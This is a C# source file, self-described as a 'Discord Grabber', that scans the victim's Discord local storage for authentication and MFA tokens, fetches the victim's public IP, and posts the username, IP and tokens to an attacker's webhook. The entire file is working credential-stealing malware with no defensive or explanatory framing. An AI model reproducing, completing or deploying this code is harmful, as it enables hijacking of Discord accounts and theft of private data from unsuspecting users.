using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;
using System.Security.Principal;


namespace DiscordG
{
    class Program
    {
        public static string webhook = ConsoleApp1.Program.Webhook_link; // Your webhook goes here


        public static List<string> GetThem()
        {
            List<string> discordtokens = new List<string>();
            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");

            foreach (var file in rootfolder.GetFiles("*.ldb"))
            {
                string readedfile = file.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    discordtokens.Add(match.Value + "\n");

                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                    discordtokens.Add(match.Value + "\n");
            }


            discordtokens = discordtokens.ToList();
            
            Console.WriteLine(discordtokens);
            
            return discordtokens;
        }

        public static string GetIP()
        {
            string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return ip;
        }

        public static void SendMeResults(List<string> tokens)
        {
            Http.Post(webhook, new NameValueCollection()
            {
                { "username", "Discord Grabber by Instinct#1121" },
                { "avatar_url", "https://64.media.tumblr.com/6fd8805db788da47a3dba1cbe04d3e58/6a63940804bf8826-ee/s400x600/c1889cd0688966c4d8433980ccb78cd04153c9a2.png" },
                { "content", "```\n" + "Report from Discord Grabber\n\n" + "Username: " + Environment.UserName + "\nIP: " + GetIP() + "\nTokens:\n\n" + string.Join("\n", tokens) + "\n\n" + "\n```" }
            });
        }
    }
    class Http
    {
        public static byte[] Post(string uri, NameValueCollection pairs)
        {
            using (WebClient webClient = new WebClient())
                return webClient.UploadValues(uri, pairs);
        }
    }
}
